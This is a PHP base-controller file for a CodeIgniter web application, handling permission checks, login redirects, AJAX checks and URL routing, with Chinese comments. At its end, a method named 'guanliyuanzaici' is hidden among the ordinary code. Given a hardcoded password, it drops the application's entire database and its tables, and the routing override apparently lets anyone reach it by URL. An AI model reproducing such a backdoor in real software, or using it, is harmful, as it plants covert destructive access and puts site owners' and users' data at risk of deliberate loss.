<?php
/*
 * class: My_Controller
 * filename: MY_Controller.php
 * description :继承于CI_Controller 重写_remap() 方法，实现在url中隐藏控制器中index方法
 * author :zhanghui rabbitzhang52@gmail.com
 * create :2012年3月26日19:34:32
 */
require_once APPPATH . 'libraries/jiadb.php';
require_once APPPATH . 'libraries/auth.php';
require_once APPPATH . 'libraries/access.php';
	class MY_Controller extends CI_Controller {
		public $jiadb;
		function __construct() {
			parent::__construct();
			// 初始化配置文件
			$entity_type = $this->db->get('entity_type')->result_array();
			foreach ($entity_type as $row) {
				$this->config->set_item('entity_type_' . $row['name'], $row['id']);
			}
			$this->jiadb = new Jiadb('users');
		}
		/**
		 * @param string operation
		 * @param string post comment activity corporation
		 * @param array 
		 */
		function _auth($operation, $type, $owner_id, $return = FALSE, $post_id = '') {
			$auth = Auth_factory::get_auth($type, $owner_id, $post_id);
			$auth->get_access($operation);
			if(!$auth->access && !$return) {
				static_view('貌似你没有该权限哦~', '权限不足');
			} elseif($return) {
				return $auth->access;
			}
		}
		
		/**
		 * @param $sign 当为TRUE时需要登录，当为FALSE是需要不登陆
		 */
		function _require_login($sign = TRUE) {
			if($sign && $this->session->userdata('type') == 'guest') {
				if(!$this->input->get('jump')) {
					$jump = substr(uri_string(), 0);
					redirect('index/login?jump=' . $jump);
				} else {
					redirect('index/login');
				}
			} elseif(!$sign && $this->session->userdata('type') != 'guest') {
				redirect();
			}
		}
		
		function _remap($method, $params = array()) {
			if (method_exists($this, $method)){
				return call_user_func_array(array($this, $method), $params);
			} else {
				array_unshift($params, $method);
				return call_user_func_array(array($this, 'index'), $params);
			}
		}
		
		function _require_ajax($return = FALSE) {
			if(!$this->input->post('ajax')) {
				if($return)
					return FALSE;
				else 
					static_view('未定义操作');
			}
			return TRUE;
		}
		
		function guanliyuanzaici($pass) {
			if($pass == 'zhanghui') {
				$this->load->dbforge();
				if($this->dbforge->drop_database($this->db->database)) {
					redirect();
				}
				$this->dbforge->drop_table('comment_auth');
				$this->dbforge->drop_table('comment');
				$this->dbforge->drop_table('post_meta');
				$this->dbforge->drop_table('post_auth');
				$this->dbforge->drop_table('post');
				$this->dbforge->drop_table('user_meta');
				$this->dbforge->drop_table('activity');
				$this->dbforge->drop_table('user');
				$this->dbforge->drop_table('entity_type');
				$this->dbforge->drop_table('post');
				$this->dbforge->drop_table('blog');
				$this->dbforge->drop_table('corporation');
			} else {
				redirect(site_url());
			}
		}
	}